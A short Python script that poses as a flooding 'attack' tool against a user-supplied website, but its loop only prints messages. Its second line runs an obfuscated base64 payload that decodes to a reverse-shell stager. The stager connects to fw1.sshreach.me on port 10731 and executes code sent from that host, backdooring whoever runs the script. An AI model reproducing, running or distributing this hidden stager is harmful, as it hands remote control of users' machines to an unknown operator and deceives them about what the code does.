import socket
import base64,sys;
exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJ2Z3MS5zc2hyZWFjaC5tZScsMTA3MzEpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK')))
link = str(input("enter the website linok : "))
host = socket.gethostbyname(link)
print("The host of",link,"is",host)
print("Attcking starting ...")
for i in range(100000000000000):
    print ("Attacking Host: ", host,"Sended Data Number: ",i)
